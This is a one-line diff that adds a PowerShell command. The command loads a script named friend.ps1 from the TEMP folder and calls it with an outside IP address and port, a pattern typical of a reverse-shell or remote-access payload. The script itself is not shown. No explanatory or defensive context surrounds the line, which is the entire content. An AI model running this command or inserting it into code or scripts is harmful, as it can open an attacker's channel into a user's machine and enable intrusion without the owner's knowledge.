@@ -1,0 +1,1 @@
+powershell.exe -c "Import-Module $env:TEMP\friend.ps1; friend -ip 206.189.226.184 -port 4453"
